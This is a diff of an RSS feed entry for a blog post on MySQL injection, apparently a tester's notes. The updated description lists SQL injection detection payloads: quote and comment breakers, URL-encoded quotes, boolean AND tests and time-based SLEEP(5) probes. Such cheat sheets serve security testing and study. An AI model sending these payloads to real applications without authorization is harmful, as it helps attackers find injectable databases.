@@ -13,7 +13,7 @@
       <link>https://Fivesix567.github.io/posts/2026/01/MySQL-injection/</link>
       <pubDate>Thu, 29 Jan 2026 20:30:38 +0800</pubDate>
       <guid>https://Fivesix567.github.io/posts/2026/01/MySQL-injection/</guid>
-      <description>&lt;!-- 在这里开始写你的文章... --&gt;&#xA;&lt;p&gt;检测payload&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#39;&#xA;&amp;#34;&#xA;`&#xA;&amp;#39;)&#xA;&amp;#34;)&#xA;;&#xA;--&#xA;#&#xA;AND 1=1&#xA;AND 1=2&#xA;&amp;#39; AND &amp;#39;1&amp;#39;=&amp;#39;1&#xA;&amp;#39; AND &amp;#39;1&amp;#39;=&amp;#39;2&#xA;&amp;#34; AND &amp;#34;1&amp;#34;=&amp;#34;1&#xA;&amp;#34; AND &amp;#34;1&amp;#34;=&amp;#34;2&#xA;&amp;#39;) AND (&amp;#39;1&amp;#39;=&amp;#39;1&#xA;&amp;#39; AND SLEEP(5)--+&#xA;&amp;#34; AND SLEEP(5)--+&#xA;AND (SELECT * FROM (SELECT(SLEEP(5)))a)&lt;/code&gt;&lt;/pre&gt;</description>
+      <description>&lt;!-- 在这里开始写你的文章... --&gt;&#xA;&lt;p&gt;检测payload&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#39;&#xA;&amp;#34;&#xA;`&#xA;%df&amp;#39;&#xA;%27&#xA;%2527&#xA;)&#xA;))&#xA;&amp;#39;)&#xA;&amp;#34;)&#xA;;&#xA;-- &#xA;/*&#xA;#&#xA;1+1&#xA;1-0&#xA;1/0&#xA;1e308&#xA;@@version&#xA;/**/&#xA;%0a&#xA;%09&#xA;--&#xA;AND 1=1&#xA;AND 1=2&#xA;&amp;#39; AND &amp;#39;1&amp;#39;=&amp;#39;1&#xA;&amp;#39; AND &amp;#39;1&amp;#39;=&amp;#39;2&#xA;&amp;#34; AND &amp;#34;1&amp;#34;=&amp;#34;1&#xA;&amp;#34; AND &amp;#34;1&amp;#34;=&amp;#34;2&#xA;&amp;#39;) AND (&amp;#39;1&amp;#39;=&amp;#39;1&#xA;&amp;#39; AND SLEEP(5)--+&#xA;&amp;#34; AND SLEEP(5)--+&#xA;AND (SELECT * FROM (SELECT(SLEEP(5)))a)&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
   </channel>
 </rss>
